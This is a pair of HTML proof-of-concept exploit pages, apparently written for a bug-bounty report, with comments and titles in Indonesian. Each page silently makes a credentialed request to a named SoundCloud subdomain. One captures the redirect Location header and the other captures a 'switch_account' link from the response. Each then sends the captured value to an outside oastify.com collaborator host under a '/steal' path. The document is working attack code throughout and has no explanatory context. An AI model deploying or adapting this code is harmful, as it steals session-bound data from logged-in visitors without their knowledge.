<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Header Location dengan Fetch</title>
</head>
<body>
    <h1>POC - Ambil Header Location dengan Fetch</h1>
    <script>
        fetch('https://airflow.soundcloud.org', {
            method: 'GET',
            credentials: 'include',
            redirect: 'manual' // Mencegah fetch mengikuti redirect otomatis
        })
        .then(response => {
            if (response.status === 302) {
                var locationHeader = response.headers.get('Location');
                if (locationHeader) {
                    console.log("Location Header:", locationHeader);
                    // Kirim lokasi ke server penyerang
                    var exfiltrateXhr = new XMLHttpRequest();
                    exfiltrateXhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?location=" + encodeURIComponent(locationHeader), true);
                    exfiltrateXhr.send();
                } else {
                    console.log("Header 'Location' tidak ditemukan.");
                }
            } else {
                console.log("Respons tidak berstatus 302, status yang diterima:", response.status);
            }
        })
        .catch(error => console.log("Gagal mengambil link:", error));
    </script>
</body>
</html>

<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Link dengan CORS</title>
</head>
<body>
    <h1>POC - Ambil Link dengan CORS</h1>
    <script>
        fetch('https://airflow.soundcloud.org', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            var parser = new DOMParser();
            var doc = parser.parseFromString(data, 'text/html');
            var linkElement = doc.getElementById('switch_account');
            if (linkElement) {
                var linkHref = linkElement.href;
                // Kirim link ke server penyerang
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://569mgtujeb7m4nztnsxzf9te157wvmjb.oastify.com/steal?link=" + encodeURIComponent(linkHref), true);
                xhr.send();
            } else {
                console.log("Element dengan id 'switch_account' tidak ditemukan.");
            }
        })
        .catch(error => console.log("Gagal mengambil link:", error));
    </script>
</body>
</html>
